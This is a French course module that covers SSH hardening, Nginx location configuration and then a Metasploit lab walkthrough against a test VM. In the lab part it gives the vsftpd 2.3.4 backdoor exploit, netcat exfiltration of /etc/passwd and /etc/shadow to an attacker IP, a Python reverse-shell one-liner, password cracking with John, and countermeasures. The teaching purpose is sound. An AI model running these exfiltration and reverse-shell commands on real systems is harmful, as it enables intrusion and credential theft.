---
module: Pratique - SSH et NGINX
jour: 08
ordre: 3
---

# Mise en pratique

## 1) SSH Begin — les bases propres & fiables

### Mental model

- **SSH = tunnel chiffré + identité** (utilisateur/machine).
- **Client** se connecte au **Serveur** sur un **port** (22 par défaut).
- La **politique** (qui peut entrer et comment) se règle côté **serveur** (`sshd_config`).
- Toujours : **tester → appliquer → vérifier**.

### Patrons réutilisables

#### A. Se connecter (et reconnaître l’hôte)

```bash
# trouver l’IP sur le serveur
ip -4 addr show   # ou ip a

# 1ère connexion (nouvel hôte → empreinte à accepter)
ssh user@IP

```

Tips :

- Si IP/DNS change → nettoyer l’empreinte :
    
    ```bash
    ssh-keygen -R IP_ou_DNS
    
    ```
    

#### B. Changer le port (ex. 5022) — *sans se tirer une balle dans le pied*

```bash
sudoedit /etc/ssh/sshd_config
# Port 5022   (décommente/ajoute)

# ordre “sécurité”
sudo sshd -t                  # 1) valider
sudo systemctl restart ssh    # 2) appliquer
ss -ltnp | grep ssh           # 3) vérifier l’écoute

```

Tips :

- **Toujours** `sshd -t` avant restart.
- Pense **firewall** si présent (UFW) :
    
    ```bash
    sudo ufw allow 5022/tcp
    
    ```
    

#### C. Créer un compte et lui donner **juste ce qu’il faut**

```bash
sudo adduser serveradmin             # crée le compte
sudo usermod -aG sudo serveradmin    # lui donne sudo

```

Pattern pro : **admin via sudo**, jamais root direct.

### Debug rapide (pattern universel)

1. **Le réseau** : `ping IP`, `nc -vz IP 5022` (ou 22).
2. **Service** : `systemctl status ssh`, `ss -ltnp | grep ssh`.
3. **Client verbeux** : `ssh -vvv -p 5022 user@IP` (on voit l’algorithme, la clé, le rejet).
4. **Logs serveur** : `sudo tail -f /var/log/auth.log`.

---

## 2) Secure SSH — authentification par **clé** et durcissement

### Mental model

- **Clé privée** = ton secret (reste chez toi).
- **Clé publique** = autorisation déposée sur le serveur.
- But : **désactiver le mot de passe** pour empêcher le bruteforce.

### Patrons réutilisables

#### A. Générer une clé (recommandé : Ed25519)

```bash
ssh-keygen -t ed25519 -f ~/.ssh/monprofil -C "monprofil@ma-machine"

```

- Privée : `~/.ssh/monprofil`
- Publique : `~/.ssh/monprofil.pub`

#### B. Déployer la clé publique (3 options)

**1) Automatique (si mot de passe encore ouvert)**

```bash
ssh-copy-id -i ~/.ssh/monprofil.pub -p 5022 user@IP

```

**2) Universelle (copie via pipe)**

```bash
cat ~/.ssh/monprofil.pub | ssh -p 5022 user@IP \
'umask 077; mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys'

```

**3) Manuel (dernière chance)**

- Créer/éditer sur le serveur : `~/.ssh/authorized_keys`
- Coller **la ligne entière** de la clé publique.

**Droits corrects (sinon SSH ignore le fichier)**

```bash
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
# HOME ≤ 755 et propriétaire = l’utilisateur, pas root

```

#### C. Forcer l’auth par clé (désactiver le mot de passe)

```bash
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config.d/50-cloud-init.conf 2>/dev/null || true
sudo sshd -t && sudo systemctl restart ssh

```

#### D. Connexion avec la clé

```bash
ssh -p 5022 -i ~/.ssh/monprofil user@IP

```

### Renforcer encore (options utiles)

Dans `/etc/ssh/sshd_config` :

```
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
KbdInteractiveAuthentication no
MaxAuthTries 3
LoginGraceTime 20
AllowUsers user1 user2             # facultatif, liste blanche
# ou par groupe : AllowGroups sshusers

```

Puis : `sudo sshd -t && sudo systemctl restart ssh`.

### Debug typiques & solutions

- **Permission denied (publickey)**
    
    → Mauvais droits/proprio sur `~/.ssh`/`authorized_keys` ou clé .pub non conforme.
    
- **We did not send a packet, disable method** (côté `ssh -vvv`)
    
    → La clé privée ne correspond pas à la clé publique sur le serveur.
    
    Vérifie l’empreinte :
    
    ```bash
    ssh-keygen -lf ~/.ssh/monprofil.pub
    
    ```
    
- **Changement d’IP/port**
    
    → `ssh-keygen -R IP` et ajuster `-p`.
    

---

## 3) My Friend Nginx — servir **/** et **/chemins** proprement

### Mental model

- Nginx lit `nginx.conf` → charge des **server blocks** (vhosts) dans `sites-enabled/`.
- Un `server {}` a une **racine** (`root`) pour `/`.
- Des **locations** surchargent la racine pour certains chemins (`location /intranet/ { … }`).
- `alias` vs `root` dans `location` :
    - `alias /chemin/` → **remplace** le préfixe URI par ce chemin.
    - `root /racine` → **concatène** la racine + l’URI.

### Patron “site par défaut + sous-chemin”

**Objectif** : garder la page Nginx pour `/`, et servir un contenu dédié pour `/intranet/`.

1. **Contenu**

```bash
sudo mkdir -p /var/www/intranet
sudo tee /var/www/intranet/index.html >/dev/null <<'HTML'
<!doctype html><meta charset="utf-8"><title>Intranet</title>
<h1>Bienvenue sur l’intranet</h1>
<p>Servi depuis /intranet/</p>
HTML
sudo chown -R www-data:www-data /var/www/intranet
sudo chmod -R 755 /var/www/intranet

```

1. **Config** (`/etc/nginx/sites-available/default`)
    
    Dans le **même** `server { … }` que la racine `/var/www/html` :
    

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /var/www/html;   # / → page par défaut
    index index.html index.htm index.nginx-debian.html;
    server_name _;

    # /intranet → redirection propre vers le slash final
    location = /intranet {
        return 301 /intranet/;
    }

    # /intranet/ → sert /var/www/intranet/
    location /intranet/ {
        alias /var/www/intranet/;
        index index.html;
        try_files $uri $uri/ =404;
    }
}

```

1. **Appliquer**

```bash
sudo nginx -t && sudo systemctl reload nginx

```

1. **Valider**

```bash
curl -I http://IP/              # 200 OK, page par défaut
curl -I http://IP/intranet      # 301 → /intranet/
curl    http://IP/intranet/     # 200 OK, intranet

```

### Variantes réutilisables

#### A. Servir un **fichier unique** à un chemin précis

```
location = /healthz { return 200 "ok\n"; add_header Content-Type text/plain; }

```

#### B. Servir un **fichier** sous `/` sans créer de dossier dédié

```
location = /intranet {
    root /var/www/html;     # -> /var/www/html/intranet
    try_files /intranet.html =404;
}

```

#### C. Reverse proxy basique (microservice)

```
location /api/ {
    proxy_pass http://127.0.0.1:3000/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}

```

### Debug & hygiène

- **Toujours** : `sudo nginx -t` avant `reload`.
- Logs :
    - accès : `/var/log/nginx/access.log`
    - erreurs : `/var/log/nginx/error.log`
    
    ```bash
    sudo tail -f /var/log/nginx/{access,error}.log
    
    ```
    
- **403 Forbidden** → droits/owner de `/var/www/...` (lecture pour `www-data`).
- **404** sur `/intranet` → vérifie `alias` vs `root` et la présence d’`index.html`.
- **301** intempestifs → `curl -I` pour voir les redirections, `L` pour les suivre.

---

### “Commandes d’or” (à mémoriser)

**SSH**

```bash
sshd -t
systemctl restart ssh
ssh -p PORT -i ~/.ssh/KEY user@IP
ssh -vvv -p PORT -i ~/.ssh/KEY user@IP
ssh-keygen -R IP

```

**Clés**

```bash
ssh-keygen -t ed25519 -f ~/.ssh/KEY -C "commentaire"
ssh-copy-id -i ~/.ssh/KEY.pub -p PORT user@IP
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys

```

**Nginx**

```bash
nginx -t
systemctl reload nginx
tail -f /var/log/nginx/error.log

```

---

### Stratégie “pro” réutilisable

1. **Préparer l’accès**
    - Créer un **compte admin non-root** + **sudo**.
    - Ouvrir SSH sur un **port connu**, tester, **clés OK**, puis **désactiver password**.
2. **Automatiser les gestes**
    - Script d’init (user, clés, sshd_config minimal).
    - Templates Nginx (vhost + blocs `location` prêts à coller).
3. **Toujours valider**
    - Avant restart : `sshd -t` / `nginx -t`.
    - Après : port à l’écoute (`ss | grep`), `curl` ou `ssh -vvv`.
4. **Journaliser et corriger**
    - Lire les **logs**.
    - Corriger **permissions/owners** (souvent la vraie cause).

## 4) Hack me if you can - Metasploit

### 4.1) Préparation de l’environnement (Vagrant, VPN, Metasploit)

But : disposer d’une VM pentest isolée connectée au réseau de test.

1. Dossier & conf
- Place-toi dans `network/` et copie le `.conf` fourni par le teacher dans `projects/` (instruit par ton lab).
2. Démarrer la VM Vagrant / provisionner

```bash
cd projects
vagrant up
vagrant provision

```

3. Vérifier l’interface VPN (wg0) et IP :

```bash
ip a show wg0
# ou
ifconfig wg0

```

Tu dois avoir une adresse IP dans le réseau du lab (ex. 10.x.x.x ou 192.168.56.x).

4. Installer Metasploit (sur la VM dédiée)

```bash
sudo apt update
sudo apt install -y gpgv2 autoconf bison build-essential postgresql libaprutil1 libgmp3-dev libpcap-dev \
  openssl libpq-dev libreadline6-dev libsqlite3-dev libssl-dev locate libsvn1 libtool libxml2 libxml2-dev \
  libxslt-dev wget libyaml-dev ncurses-dev postgresql-contrib xsel zlib1g-dev curl

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

```

Si PostgreSQL pose problème :

```bash
sudo systemctl start postgresql

```

Lance Metasploit :

```bash
msfconsole

```

---

### 4.2) Phase 1 — Reconnaissance avec Nmap (via Metasploit ou externe)

Principe : découvrir services, versions et ports. Toujours sauvegarder résultats.

Commande (dans msfconsole ou terminal si tu préfères) :

```bash
# depuis msfconsole
nmap -p- -sC -sV <IP_CIBLE> -oX Metasploitable.xml

# ou depuis le shell
nmap -p- -sC -sV <IP_CIBLE> -oX Metasploitable.xml

```

- `p-` : tous les ports
- `sC` : scripts par défaut (DNS, FTP, HTTP info, etc.)
- `sV` : détection de version
- `oX` : sortie XML (utile pour Metasploit / rapport)

Convertir en HTML pour lecture :

```bash
sudo apt install -y xsltproc
xsltproc Metasploitable.xml -o Metasploitable.html
# puis ouvre Metasploitable.html dans ton navigateur (ou scp sur hôte)

```

**Ce que tu dois repérer dans le rapport**

- Ports ouverts (ex. 21 ftp, 22 ssh, 80 http, etc.)
- Versions (ex. `vsftpd 2.3.4`) → clé pour trouver des exploits (CVE connus)

---

### 4.3) Phase 2 — Choix de l’exploit et configuration (ex : vsftpd 2.3.4)

1. Recherche d’exploits dans Metasploit :

```bash
msf6 > search vsftpd

```

2. Choisir l’exploit (ex. `unix/ftp/vsftpd_234_backdoor`) :

```bash
msf6 > use unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
# (si nécessaire) set RPORT 21
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

```

Si l’exploit fonctionne, tu obtiens une **session** (shell). C’est la preuve que la machine est compromise.

**Tips**

- Lis `show options` et `show payloads` : souvent il faut définir `LHOST` (ton IP) pour les payloads reverse.
- `set VERBOSE true` si tu veux plus d’info.
- Si l’exploit échoue, regarde le `nmap` et les logs : version différente, service patché, ou nécessité d’un payload différent.

---

### 4.4) Phase 3 — Post-exploitation & exfiltration (netcat example)

Objectif pédagogique : extraire fichiers sensibles sans laisser de traces sur la cible.

Sur ta machine (attacker / VM), prépare un écouteur netcat pour capter la sortie :

```bash
# sur votre VM (attacker)
nc -lvp 1234 > /home/engineer/setup/hackmeifyoucan/passwd.txt
# l'option -l (listen), -v (verbose), -p port

```

Sur la cible (via la session obtenue) :

```bash
# envoyer /etc/passwd vers ton écouteur
nc -w 3 <VOTRE_IP> 1234 < /etc/passwd

# envoyer /etc/shadow (si lisible)
nc -w 3 <VOTRE_IP> 1234 < /etc/shadow

```

Si `nc` absent ou bloqué, alternative : `cat /etc/passwd` et copier la sortie manuellement depuis la session Metasploit (mais attention traces).

**Remarques pratiques**

- `w 3` force le timeout, utile dans les lab.
- Si la cible n’a pas `nc`, utilise `python -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"ATK_IP\",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"])'` — mais évite cela hors lab.

---

### 4.5) Phase 4 — Cracker les mots de passe (John The Ripper)

1. Recupération & préparation :
- Ton `passwd.txt` et `shadow.txt` collectés : combine avec `unshadow` (fourni par John) :

```bash
sudo apt install -y john
sudo unshadow passwd.txt shadow.txt > unshadow.txt

```

1. Lancer John :

```bash
sudo john unshadow.txt
# suivre la progression
sudo john --show unshadow.txt    # affiche les mots de passe découverts

```

**Conseils**

- John utilise des règles / wordlists ; pour s’améliorer : `-wordlist=/usr/share/wordlists/rockyou.txt --rules`
- Les mots de passe faibles se cassent rapidement ; s’il y a du sel ou SHA512, ça peut durer.

---

### 4.6) Phase 5 — Connexion SSH avec identifiants récupérés

1. Si John retourne `msfadmin:password`, teste une connexion SSH :

```bash
ssh msfadmin@192.168.56.102
# ou si port non-standard :
ssh -p <PORT> msfadmin@192.168.56.102

```

1. Si la connexion SSH échoue, Metasploit fournit `auxiliary/scanner/ssh/ssh_login` pour tester un couple user/password à grande échelle :

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.56.102
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME msfadmin
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD msfadmin
msf6 auxiliary(scanner/ssh/ssh_login) > run

```

S’il y a succès, Metasploit peut ouvrir une session. Note que ces sessions peuvent être moins interactives (pas de gestion complète du TTY) ; pour une interactive shell, utilise `sessions -i <id>` et `shell` si possible.

---

### 4.7) Comprendre ce que tu as fait et pourquoi (fond)

- **Reconnaissance** : collecte d’info → permet de réduire l’espace d’attaque (connaître versions/ports).
- **Exploit** : utilise une vulnérabilité connue (ici vsftpd 2.3.4 avait une backdoor). Un exploit automatisé combine vulnérabilité + payload.
- **Payload** : le code injecté (reverse shell, bind shell, meterpreter) ; il faut configurer `LHOST`, `LPORT` pour recevoir la session.
- **Post-exploitation** : maintient d’accès, collecte d’infos sensibles (passwd, shadow), élévation de privilèges possible, mouvement latéral.
- **Cracking** : convertir hashes en mots de passe pour obtenir accès réel (SSH).
- **Nettoyage / traces** : en pentest éthique, note tout et ne modifie pas l’état sauf si autorisé ; conserve logs et preuves.

---

### 4.8) Dépannage & erreurs courantes (tableau)

| Problème | Cause fréquente | Solution / commande |
| --- | --- | --- |
| msfconsole plante ou modules absents | PostgreSQL down ou msfdb non lancé | `sudo systemctl start postgresql` ; `msfdb init` |
| Nmap ne détecte rien / trop lent | Firewall, host down, rate limiting | `nmap -Pn -p- --min-rate 1000 <IP>` ; vérifier `ss` sur la cible |
| Exploit échoue | Mauvaise version, patch appliqué, mauvais RHOST/LHOST | Relire `nmap`, `show options`, ajuster payload/LHOST, tester autre payload |
| Netcat ne connecte pas | Pare-feu, route, mauvaise IP | Vérifier IP interface (`ip a`), désactiver ufw temporairement (`sudo ufw status`), tester `nc -vz IP 1234` |
| John ne casse rien | Hashs solides / wordlist inadaptée | Utiliser wordlists plus grandes (rockyou), règles, ou GPU cracking |

(Deuxième tableau inutile — on s’en tient à celui-ci pour clarté.)

---

### 4.9) Contre-mesures & ce que le Défenseur doit faire

Pour chaque étape offensive, il existe des contrôles simples :

- **Réconnaissance** : minimiser info publique (masquer bannières), limiter réponses ICMP (rate limit).
- **Scan/ports** : firewall (nmap verra moins), honeypots pour détecter scans.
- **Exploits connus** : patcher (gestion CVE), WAF pour bloquer payloads connus.
- **Exfiltration** : egress filtering, IDS/IPS (Suricata) pour détecter connexions inhabituelles (ex. nc vers IP externe).
- **Hash leakage** : rendre /etc/shadow illisible par les services exposés, privilégier stockage sécurisé (LDAP/SSO), activer PAM rate-limiters.
- **Post-compromise** : détection des comptes / clés ajoutés, alertes sur modifications de `/etc/passwd`, `/etc/shadow`, ou `sshd_config`.

Commandes défensives utiles (exemples) :

```bash
# détecter scans nmap (logs)
sudo grep "Nmap scan report" /var/log/*

# restreindre egress (exemple ufw)
sudo ufw deny out from any to <IP_ATTACKER> port 1234 proto tcp

# voir connexions sortantes
ss -tunp | grep ESTAB

```

---

### Pour aller plus loin (si tu veux)

- Automatiser la reconnaissance : `nmap -oA cible && nikto -h target`
- Utiliser `metasploit` pour générer un rapport automatisé (xml → html)
- Étudier Meterpreter (payload avancé) pour post-exploitation contrôlée
- Apprendre la mitigation avancée : SELinux/AppArmor, eBPF pour monitoring réseau, gestion centralisée des logs (ELK/Wazuh)